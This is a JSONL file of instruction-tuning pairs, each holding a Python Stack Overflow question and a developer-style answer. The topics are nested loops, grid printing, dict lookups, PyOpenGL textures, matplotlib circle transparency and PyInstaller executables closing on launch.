{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Nested For Loops in Python (calculating the perimeters of triangles)<p>I want to calculate perimeters of triangles. I want to access concrete elements of the list, so I am using a nested for loop. 1)\nI would like to know why the position of <code>perimeter<\/code> makes my code different in both variants. (in the second one I don't understand why the output is 240)\n2) I would like to know how to concatenate all items in the nested lists, so the output should be like that: (I tried using indexing, but it didn't work)<\/p>\n<pre><code>60\n150\n240\n<\/code><\/pre>\n<p>The First:<\/p>\n<pre><code>def function(triangle):\n    perimeter = 0\n    for i in triangle:\n        for j in i:\n            perimeter = perimeter + j\n    return perimeter\n\nfunction([[10,20,30], [40,50,60], [70,80,90]])\n450\n<\/code><\/pre>\n<p>The Second:<\/p>\n<pre><code>def function(triangle):\n    for i in triangle:\n        perimeter = 0\n        for j in i:\n            perimeter = perimeter + j\n    return perimeter\n\nfunction([[10,20,30], [40,50,60], [70,80,90]])\n240\n<\/code><\/pre>","output_text":"<p>1 - The difference between two codes is that, in the first one <code>perimeter<\/code> is set to 0 before the loop starts, and than updated throughout the loop. In the second one, you set the <code>perimeter<\/code> value to 0 every time the outer loop is executed, so the value from previous loop is not accumulated in it.<\/p>\n<p>2- For loop you can use the following method:<\/p>\n<pre><code>triangles = [[10,20,30], [40,50,60], [70,80,90]]\nperimeters = list(map(sum,triangles))\nprint(perimeters)\n[60, 150, 240]\n<\/code><\/pre>\n<p>Here, <code>map<\/code> iterates over the elements of <code>triangles<\/code> and calls the <code>sum<\/code> function for each element. Then, using <code>list<\/code> you can convert it to a list of perimeter values.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Lists within Lists, Loops within loops Automate the Boring Stuff<p>So i am trying to work my way though the Automate the Boring Stuff book and class but I am having a terrible time trying to figure out the second practice question at the end of chapter 4.<\/p>\n<p>The problem asks to copy this<\/p>\n<p>grid = <br>[['.','.','.','.','.','.'],<br>\n['.','0','0','.','.','.'],<br>\n['0','0','0','0','.','.'],<br>\n['0','0','0','0','0','.'],<br>\n['.','0','0','0','0','0'],<br>\n['0','0','0','0','0','.'],<br>\n['0','0','0','0','.','.'],<br>\n['.','0','0','.','.','.'],<br>\n['.','.','.','.','.','.']]<br><\/p>\n<p>And write a code that prints it out like this<\/p>\n<p>..OO.OO..<br>\n.OOOOOOO.<br>\n.OOOOOOO.<br>\n..OOOOO..<br>\n...OOO...<br>\n....O....<br><\/p>\n<p>So I was able to figure out how to call the list within a list values and print the heart sideways using this code:<\/p>\n<pre><code>grid = [['.','.','.','.','.','.'],\n    ['.','0','0','.','.','.'],\n    ['0','0','0','0','.','.'],\n    ['0','0','0','0','0','.'],\n    ['.','0','0','0','0','0'],\n    ['0','0','0','0','0','.'],\n    ['0','0','0','0','.','.'],\n    ['.','0','0','.','.','.'],\n    ['.','.','.','.','.','.']]\n    \n\nfor x in grid:\n    for y in x:\n        print(y,end='')\n    print('\\n')\n<\/code><\/pre>\n<p>Now I am trying to figure out how to print it the right way. I understand that I need to call the values at the 0 index within each list in the whole list first, then the 1 index and so on.<\/p>\n<p>I looked at other answers and adjusted my code to this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for x in range(len(grid[0])):\n    for y in range(len(grid)):\n        print(grid[x][y],end='')\n    print('\\n')\n<\/code><\/pre>\n<p>Initially I had it without range(len()) but it gave me an error saying indices must be integers(which is fixed using the len function i assume because the len function returns an actual integer, right?). Now I am getting an error that my list is out of range. I have been trying to figure this out on my own for a few hours now and I am just not understanding at all and trying to quell my frustration. Can anyone help me out? Ive seen some other answers with some more advanced methods used to complete the practice but I am really trying to grasp these concepts I am learning now and just the basics in general so I am only looking for suggestions that involve really the simplest methods of lists, and loops. Thank you guys and I can add more information if necessary.<\/p>","output_text":"<p>You should swap the looping variables during printing (effectively rotating the print).<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for x in range(len(grid[0])):\n    for y in range(len(grid)):\n        print(grid[y][x],end='')\n    print() # Removed '\\n' here because it printed two lines (end='\\n' by default)\n<\/code><\/pre>\n<p>This works because the outer loop (<code>x<\/code>) is through each column, and the inner loop (<code>y<\/code>) is through each row. So by printing in that order you effectively rotate the image.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Have dictionary.get return nothing<p>I want to use dictionary.get method but to return nothing (not None) when a key is missing, is it possible without &quot;filtering&quot; the output:<\/p>\n<pre><code>d = {1:'a', 2:'b'}\nvals = [1,2,3]\n\n#I want the output to look like:\nnewvals = [d[v] for v in vals if v in d]\n#newvals\n#['a', 'b']\n\n#But this will return default value which is None:\nnewvals2 = [d.get(v) for v in vals]\n#&gt;&gt;&gt; newvals2\n#['a', 'b', None]\n\n#(I know I can add this, but do I have to?)\n#newvals2 = [val for val in newvals if val]\n#['a', 'b']\n<\/code><\/pre>","output_text":"<p>If you don\u2019t want anything at all, don\u2019t think there's a better way than this:<\/p>\n<pre><code>newvals2 = [d[v] for v in vals if v in d]\n<\/code><\/pre>\n<p>Edit: I missed you already tried it. Either way, this approach seems fine without any issue. Complexity of <code>in<\/code> is <a href=\"https:\/\/stackoverflow.com\/questions\/17539367\/python-dictionary-keys-in-complexity\">O(1)<\/a> anyway.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n pyOpenGL how to draw 2d image?<p>I tried many things and found out how to get data using pillow and numpy. Even if I looked around, I could only see how to make vertex and fragments in 3d, and I couldn't find a way to actually draw a 2d image.<\/p>\n<pre><code>texture = glGenTextures(1)\nglBindTexture(GL_TEXTURE_2D, texture)\nglTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT)\nglTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT)\nglTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR)\nglTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR)\ntex = Image.open(&quot;Resources\/bg55.png&quot;)\nmode = &quot;&quot;.join(Image.Image.getbands(tex))\ndata = tex.tobytes(&quot;raw&quot;, &quot;RGBA&quot;, 0, -1)\nglTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, tex.width, tex.height, 0, GL_RGBA, GL_UNSIGNED_BYTE, data)\nglGenerateMipmap(GL_TEXTURE_2D)\n<\/code><\/pre>\n<p>Is this code correct? How can I continue? glfw and pyopengl is in use.<\/p>","output_text":"<p>You need to draw a rectangle and wrap the texture on it. This is the usual way to proceed. OpenGL renders primitives and does not draw images. See the very basic example:<\/p>\n<p>image <a href=\"https:\/\/i.stack.imgur.com\/uQuiu.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/uQuiu.png\" alt=\"\" \/><\/a><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/Ev2Aj.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/Ev2Aj.png\" alt=\"\" \/><\/a><\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import pygame\nfrom pygame.locals import *\nfrom OpenGL.GL import *\nfrom OpenGL.GLU import *\nfrom PIL import Image\nfrom numpy import array\n\ndef loadTexture(texture):\n    try:\n        text = Image.open(texture)\n    except IOError as ex:\n        print(&quot;Failed to open texture file: &quot;, texture)\n        text = Image.open(&quot;0.png&quot;)\n\n    textData = array(list(text.getdata()))\n    textID = glGenTextures(1)\n    glPixelStorei(GL_UNPACK_ALIGNMENT, 1)\n    glBindTexture(GL_TEXTURE_2D, textID)\n    glTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST)\n    glTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST)\n    glTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER)\n    glTexParameterf(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER)\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_BASE_LEVEL, 0)\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAX_LEVEL, 0)\n    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, text.size[0], text.size[1], 0, GL_RGBA, GL_UNSIGNED_BYTE, textData)\n    text.close()\n    return textID\n\ndef drawQuad(centerX, centerY, textureID):\n    verts = ((1, 1), (1,-1), (-1,-1), (-1,1))\n    texts = ((1, 0), (1, 1), (0, 1), (0, 0))\n    surf = (0, 1, 2, 3)\n\n    glEnable(GL_TEXTURE_2D)\n    glBindTexture(GL_TEXTURE_2D, textureID)\n\n    glBegin(GL_QUADS)\n    for i in surf:\n        glTexCoord2f(texts[i][0], texts[i][1])\n        glVertex2f(centerX + verts[i][0], centerY + verts[i][1])\n    glEnd()\n    \n    glDisable(GL_TEXTURE_2D)\n\ndef main():\n    pygame.init()\n    disp = (200, 200)\n    pygame.display.set_mode(disp, DOUBLEBUF|OPENGL)\n    gluPerspective(45, (disp[0] \/ disp[1]), 0.1, 50.0)\n    glTranslatef(0.0, 0.0, -5)\n    textID = loadTexture(&quot;0.png&quot;)\n\n    while True:\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                pygame.quit()\n                quit()\n        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT)\n        drawQuad(0, 0, textID)\n        pygame.display.flip()\n        pygame.time.wait(10)\n        \nmain()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n matplotlib.patches Circle - transparent?<p>How to make the circle clear transparent? The desired result is a black edge and None colour to see the plots behind the circle.<\/p>\n<pre><code>import matplotlib.pyplot as plt\nfrom mpl_toolkits.mplot3d import Axes3D                 # 3d graph\nfrom mpl_toolkits.mplot3d import proj3d                 # 3d graph\nfrom matplotlib.patches import FancyArrowPatch\nfrom mpl_toolkits.mplot3d import proj3d, art3d  \nfrom matplotlib.patches import Circle\n\n# Plot figure\nfigsize=[5,5]\nfig = plt.figure(figsize=figsize)\nax = fig.add_subplot(111, projection='3d')\nax.azim = -57   # y rotation (default=270)\nax.elev = 29     # x rotation (default=0)\n\n# Set limits\nax.set_xlim(-50, 50)\nax.set_ylim(0, 1)\nax.set_zlim(-50, 50)\n\nR = 50\nfloor_front = Circle((0, 0), R, linewidth=2, edgecolor = 'black', alpha = 0.3)   # (x, z), radius\nax.add_patch(floor_front)\nart3d.pathpatch_2d_to_3d(floor_front, z=0, zdir=&quot;y&quot;)        # z = corresponds to y \nplt.show()\n<\/code><\/pre>","output_text":"<p>In Circle(), add <code>facecolor=&quot;none&quot;<\/code>.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/syDWj.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/syDWj.png\" alt=\"facecolor_none\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n PyInstaller closes the program immediately after opening<p>I beg your pardon in advance, my English is bad. I use Google Translate.<\/p>\n<p>Simple code \u2014 <code>print(&quot;Hello!&quot;)<\/code><\/p>\n<p>Here's what's in the terminal:<\/p>\n<pre><code>PS C:\\OOTDDir\\PythonDev\\pizza&gt; pyinstaller -F hello.py\n109 INFO: PyInstaller: 4.5.1\n109 INFO: Python: 3.9.6\n109 INFO: Platform: Windows-10-10.0.19042-SP0\n109 INFO: wrote C:\\OOTDDir\\PythonDev\\pizza\\hello.spec\n109 INFO: UPX is not available.\n109 INFO: Extending PYTHONPATH with paths\n['C:\\\\OOTDDir\\\\PythonDev\\\\pizza', 'C:\\\\OOTDDir\\\\PythonDev\\\\pizza']\n464 INFO: checking Analysis\n465 INFO: Building Analysis because Analysis-00.toc is non existent\n465 INFO: Initializing module dependency graph...\n467 INFO: Caching module graph hooks...\n486 INFO: Analyzing base_library.zip ...\n3150 INFO: Processing pre-find module path hook distutils from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\pre_find_module_path\\\\hook-distutils.py'.\n3150 INFO: distutils: retargeting to non-venv dir 'c:\\\\ootddir\\\\python\\\\lib'\n6278 INFO: Caching module dependency graph...\n6482 INFO: running Analysis Analysis-00.toc\n6484 INFO: Adding Microsoft.Windows.Common-Controls to dependent assemblies of final executable\n  required by c:\\ootddir\\python\\python.exe\n6546 WARNING: lib not found: api-ms-win-core-path-l1-1-0.dll dependency of c:\\ootddir\\python\\python39.dll\n6718 INFO: Analyzing C:\\OOTDDir\\PythonDev\\pizza\\hello.py\n6718 INFO: Processing module hooks...\n6718 INFO: Loading module hook 'hook-difflib.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6718 INFO: Loading module hook 'hook-distutils.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6718 INFO: Loading module hook 'hook-distutils.util.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6734 INFO: Loading module hook 'hook-encodings.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6812 INFO: Loading module hook 'hook-heapq.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6812 INFO: Loading module hook 'hook-lib2to3.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6953 INFO: Loading module hook 'hook-multiprocessing.util.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6953 INFO: Loading module hook 'hook-pickle.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6953 INFO: Loading module hook 'hook-sysconfig.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6953 INFO: Loading module hook 'hook-xml.etree.cElementTree.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n6953 INFO: Loading module hook 'hook-xml.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7015 INFO: Loading module hook 'hook-_tkinter.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7125 INFO: checking Tree\n7125 INFO: Building Tree because Tree-00.toc is non existent\n7125 INFO: Building Tree Tree-00.toc\n7250 INFO: checking Tree\n7250 INFO: Building Tree because Tree-01.toc is non existent\n7250 INFO: Building Tree Tree-01.toc\n7328 INFO: checking Tree\n7328 INFO: Building Tree because Tree-02.toc is non existent\n7328 INFO: Building Tree Tree-02.toc\n7356 INFO: Looking for ctypes DLLs\n7372 INFO: Analyzing run-time hooks ...\n7376 INFO: Including run-time hook 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\rthooks\\\\pyi_rth_pkgutil.py'\n7381 INFO: Including run-time hook 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\rthooks\\\\pyi_rth_multiprocessing.py'\n7384 INFO: Including run-time hook 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\rthooks\\\\pyi_rth_inspect.py'\n7392 INFO: Looking for dynamic libraries\n7536 INFO: Looking for eggs\n7536 INFO: Using Python library c:\\ootddir\\python\\python39.dll\n7536 INFO: Found binding redirects:\n[]\n7536 INFO: Warnings written to C:\\OOTDDir\\PythonDev\\pizza\\build\\hello\\warn-hello.txt\n7583 INFO: Graph cross-reference written to C:\\OOTDDir\\PythonDev\\pizza\\build\\hello\\xref-hello.html\n7599 INFO: checking PYZ\n7599 INFO: Building PYZ because PYZ-00.toc is non existent\n7599 INFO: Building PYZ (ZlibArchive) C:\\OOTDDir\\PythonDev\\pizza\\build\\hello\\PYZ-00.pyz\n8148 INFO: Building PYZ (ZlibArchive) C:\\OOTDDir\\PythonDev\\pizza\\build\\hello\\PYZ-00.pyz completed successfully.\n8164 INFO: checking PKG\n8164 INFO: Building PKG because PKG-00.toc is non existent\n8164 INFO: Building PKG (CArchive) PKG-00.pkg\n10044 INFO: Building PKG (CArchive) PKG-00.pkg completed successfully.\n10044 INFO: Bootloader c:\\ootddir\\python\\lib\\site-packages\\PyInstaller\\bootloader\\Windows-64bit\\run.exe\n10044 INFO: checking EXE\n10060 INFO: Building EXE because EXE-00.toc is non existent\n10060 INFO: Building EXE from EXE-00.toc\n10062 INFO: Copying icons from ['c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\bootloader\\\\images\\\\icon-console.ico']\n10062 INFO: Writing RT_GROUP_ICON 0 resource with 104 bytes\n10062 INFO: Writing RT_ICON 1 resource with 3752 bytes\n10062 INFO: Writing RT_ICON 2 resource with 2216 bytes\n10062 INFO: Writing RT_ICON 3 resource with 1384 bytes\n10062 INFO: Writing RT_ICON 4 resource with 37019 bytes\n10062 INFO: Writing RT_ICON 5 resource with 9640 bytes\n10062 INFO: Writing RT_ICON 6 resource with 4264 bytes\n10062 INFO: Writing RT_ICON 7 resource with 1128 bytes\n10078 INFO: Updating manifest in C:\\OOTDDir\\PythonDev\\pizza\\build\\hello\\run.exe.mx2u8v5f\n10078 INFO: Updating resource type 24 name 1 language 0\n10078 INFO: Appending archive to EXE C:\\OOTDDir\\PythonDev\\pizza\\dist\\hello.exe\n11616 INFO: Building EXE from EXE-00.toc completed successfully.\n<\/code><\/pre>\n<p>Removing the &quot;F&quot; flag does not solve the problem.<\/p>\n<p>PyInstaller creates a file, but it closes immediately upon clicking. In a situation where I try to run my test game code, with the window flag -w, I see an error:\n<a href=\"https:\/\/i.stack.imgur.com\/JGMYM.png\" rel=\"nofollow noreferrer\">Error<\/a><\/p>\n<p>And in the terminal it is:<\/p>\n<pre><code>PS C:\\OOTDDir\\PythonDev\\alien_invasion&gt; pyinstaller -F alien_invasion.py\n54 INFO: PyInstaller: 4.5.1\n54 INFO: Python: 3.9.6\n70 INFO: Platform: Windows-10-10.0.19042-SP0\n70 INFO: wrote C:\\OOTDDir\\PythonDev\\alien_invasion\\alien_invasion.spec\n70 INFO: UPX is not available.\n70 INFO: Extending PYTHONPATH with paths\n['C:\\\\OOTDDir\\\\PythonDev\\\\alien_invasion',\n 'C:\\\\OOTDDir\\\\PythonDev\\\\alien_invasion']\n305 INFO: checking Analysis\n305 INFO: Building Analysis because Analysis-00.toc is non existent\n305 INFO: Initializing module dependency graph...\n321 INFO: Caching module graph hooks...\n336 INFO: Analyzing base_library.zip ...\n2691 INFO: Processing pre-find module path hook distutils from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\pre_find_module_path\\\\hook-distutils.py'.\n2691 INFO: distutils: retargeting to non-venv dir 'c:\\\\ootddir\\\\python\\\\lib'\n5835 INFO: Caching module dependency graph...\n6007 INFO: running Analysis Analysis-00.toc\n6022 INFO: Adding Microsoft.Windows.Common-Controls to dependent assemblies of final executable\n  required by c:\\ootddir\\python\\python.exe\n6100 WARNING: lib not found: api-ms-win-core-path-l1-1-0.dll dependency of c:\\ootddir\\python\\python39.dll\n6288 INFO: Analyzing C:\\OOTDDir\\PythonDev\\alien_invasion\\alien_invasion.py\n6535 INFO: Processing pre-find module path hook site from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\pre_find_module_path\\\\hook-site.py'.\n6551 INFO: site: retargeting to fake-dir 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\fake-modules'\n7554 INFO: Processing module hooks...\n7554 INFO: Loading module hook 'hook-pygame.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\pygame\\\\__pyinstaller'...\npygame 2.0.1 (SDL 2.0.14, Python 3.9.6)\nHello from the pygame community. https:\/\/www.pygame.org\/contribute.html\n7601 INFO: Loading module hook 'hook-difflib.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7617 INFO: Loading module hook 'hook-distutils.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7617 INFO: Loading module hook 'hook-distutils.util.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7617 INFO: Loading module hook 'hook-encodings.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7695 INFO: Loading module hook 'hook-heapq.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7695 INFO: Loading module hook 'hook-lib2to3.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7868 INFO: Loading module hook 'hook-multiprocessing.util.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7884 INFO: Loading module hook 'hook-pickle.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n7884 INFO: Loading module hook 'hook-pkg_resources.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n8167 INFO: Processing pre-safe import module hook win32com from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\_pyinstaller_hooks_contrib\\\\hooks\\\\pre_safe_import_module\\\\hook-win32com.py'.\n8443 WARNING: Hidden import &quot;pkg_resources.py2_warn&quot; not found!\n8443 WARNING: Hidden import &quot;pkg_resources.markers&quot; not found!\n8443 INFO: Loading module hook 'hook-sysconfig.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n8443 INFO: Loading module hook 'hook-win32ctypes.core.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n8583 INFO: Loading module hook 'hook-xml.dom.domreg.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n8583 INFO: Loading module hook 'hook-xml.etree.cElementTree.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n8583 INFO: Loading module hook 'hook-xml.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n8583 INFO: Loading module hook 'hook-_tkinter.py' from 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks'...\n8694 INFO: checking Tree\n8694 INFO: Building Tree because Tree-00.toc is non existent\n8694 INFO: Building Tree Tree-00.toc\n8757 INFO: checking Tree\n8757 INFO: Building Tree because Tree-01.toc is non existent\n8757 INFO: Building Tree Tree-01.toc\n8820 INFO: checking Tree\n8820 INFO: Building Tree because Tree-02.toc is non existent\n8820 INFO: Building Tree Tree-02.toc\n8851 INFO: Looking for ctypes DLLs\n8882 INFO: Analyzing run-time hooks ...\n8882 INFO: Including run-time hook 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\rthooks\\\\pyi_rth_pkgutil.py'\n8898 INFO: Including run-time hook 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\rthooks\\\\pyi_rth_multiprocessing.py'\n8898 INFO: Including run-time hook 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\rthooks\\\\pyi_rth_inspect.py'\n8898 INFO: Including run-time hook 'c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\hooks\\\\rthooks\\\\pyi_rth_pkgres.py'\n8914 INFO: Looking for dynamic libraries\n9336 INFO: Looking for eggs\n9336 INFO: Using Python library c:\\ootddir\\python\\python39.dll\n9336 INFO: Found binding redirects:\n[]\n9336 INFO: Warnings written to C:\\OOTDDir\\PythonDev\\alien_invasion\\build\\alien_invasion\\warn-alien_invasion.txt\n9398 INFO: Graph cross-reference written to C:\\OOTDDir\\PythonDev\\alien_invasion\\build\\alien_invasion\\xref-alien_invasion.html\n9414 INFO: checking PYZ\n9414 INFO: Building PYZ because PYZ-00.toc is non existent\n9414 INFO: Building PYZ (ZlibArchive) C:\\OOTDDir\\PythonDev\\alien_invasion\\build\\alien_invasion\\PYZ-00.pyz\n10090 INFO: Building PYZ (ZlibArchive) C:\\OOTDDir\\PythonDev\\alien_invasion\\build\\alien_invasion\\PYZ-00.pyz completed successfully.\n10105 INFO: checking PKG\n10105 INFO: Building PKG because PKG-00.toc is non existent\n10105 INFO: Building PKG (CArchive) PKG-00.pkg\n12901 INFO: Building PKG (CArchive) PKG-00.pkg completed successfully.\n12901 INFO: Bootloader c:\\ootddir\\python\\lib\\site-packages\\PyInstaller\\bootloader\\Windows-64bit\\run.exe\n12901 INFO: checking EXE\n12901 INFO: Building EXE because EXE-00.toc is non existent\n12901 INFO: Building EXE from EXE-00.toc\n12901 INFO: Copying icons from ['c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\bootloader\\\\images\\\\icon-console.ico']\n12901 INFO: Writing RT_GROUP_ICON 0 resource with 104 bytes\n12901 INFO: Writing RT_ICON 1 resource with 3752 bytes\n12901 INFO: Writing RT_ICON 2 resource with 2216 bytes\n12901 INFO: Writing RT_ICON 3 resource with 1384 bytes\n12901 INFO: Writing RT_ICON 4 resource with 37019 bytes\n12901 INFO: Writing RT_ICON 5 resource with 9640 bytes\n12901 INFO: Writing RT_ICON 6 resource with 4264 bytes\n12901 INFO: Writing RT_ICON 7 resource with 1128 bytes\n12901 INFO: Updating manifest in C:\\OOTDDir\\PythonDev\\alien_invasion\\build\\alien_invasion\\run.exe.m_3ze9i1\n12901 INFO: Updating resource type 24 name 1 language 0\n12916 INFO: Appending archive to EXE C:\\OOTDDir\\PythonDev\\alien_invasion\\dist\\alien_invasion.exe\n15159 INFO: Building EXE from EXE-00.toc completed successfully.\nPS C:\\OOTDDir\\PythonDev\\alien_invasion&gt; pyinstaller -F -w alien_invasion.py\n63 INFO: PyInstaller: 4.5.1\n63 INFO: Python: 3.9.6\n79 INFO: Platform: Windows-10-10.0.19042-SP0\n79 INFO: wrote C:\\OOTDDir\\PythonDev\\alien_invasion\\alien_invasion.spec\n79 INFO: UPX is not available.\n79 INFO: Extending PYTHONPATH with paths\n['C:\\\\OOTDDir\\\\PythonDev\\\\alien_invasion',\n 'C:\\\\OOTDDir\\\\PythonDev\\\\alien_invasion']\n318 INFO: checking Analysis\n333 INFO: checking PYZ\n349 INFO: checking PKG\n366 INFO: Bootloader c:\\ootddir\\python\\lib\\site-packages\\PyInstaller\\bootloader\\Windows-64bit\\runw.exe\n366 INFO: checking EXE\n366 INFO: Building because console changed\n366 INFO: Building EXE from EXE-00.toc\n407 INFO: Copying icons from ['c:\\\\ootddir\\\\python\\\\lib\\\\site-packages\\\\PyInstaller\\\\bootloader\\\\images\\\\icon-windowed.ico']\n407 INFO: Writing RT_GROUP_ICON 0 resource with 104 bytes\n407 INFO: Writing RT_ICON 1 resource with 3752 bytes\n407 INFO: Writing RT_ICON 2 resource with 2216 bytes\n407 INFO: Writing RT_ICON 3 resource with 1384 bytes\n407 INFO: Writing RT_ICON 4 resource with 38188 bytes\n407 INFO: Writing RT_ICON 5 resource with 9640 bytes\n407 INFO: Writing RT_ICON 6 resource with 4264 bytes\n407 INFO: Writing RT_ICON 7 resource with 1128 bytes\n407 INFO: Updating manifest in C:\\OOTDDir\\PythonDev\\alien_invasion\\build\\alien_invasion\\runw.exe.2gd3qgqs\n407 INFO: Updating resource type 24 name 1 language 0\n407 INFO: Appending archive to EXE C:\\OOTDDir\\PythonDev\\alien_invasion\\dist\\alien_invasion.exe\n2778 INFO: Building EXE from EXE-00.toc completed successfully.\n<\/code><\/pre>\n<p>I went through a large number of sites, but did not find a solution. I have been studying Python for about the second month, and for the first time I encountered such an incomprehensible problem. Frankly, I'm desperate. I almost finished analyzing the basic functions of PyGame and thought to start writing my own game, but I spent a lot of hours on this problem and it completely unsettled me.<\/p>\n<p>The only hope is for you. Sorry for the verbosity.<\/p>\n<blockquote>\n<p><strong>Eventually:<\/strong><\/p>\n<\/blockquote>\n<p>It was enough to transfer the folder with the resources to the folder with the .exe file (in my case, this is the &quot;images&quot; folder with &quot;.bmp&quot; files).<\/p>\n<p>In the case of a console application, <code>input<\/code> solves the same problem, and if you enclose it in a <code>while<\/code> loop, there will be no problem either.<\/p>","output_text":"<p>If the program closes right after it gets opened, it means that either you have an error in your code, or that everything just worked fine and the code finish executing.<\/p>\n<p>If you run your code as a <code>.py<\/code> file and everything worked, it means that the problem is that the code just finishes executing so it closes automatically. In this scenario, you could just add a simple<\/p>\n<pre><code>while True:\n    pass\n<\/code><\/pre>\n<p>Infinite loop, that does nothing, <strong>at the end of your script<\/strong>. Just now that the screen will freeze once he gets to this code, but won't close right after opening.<\/p>"}
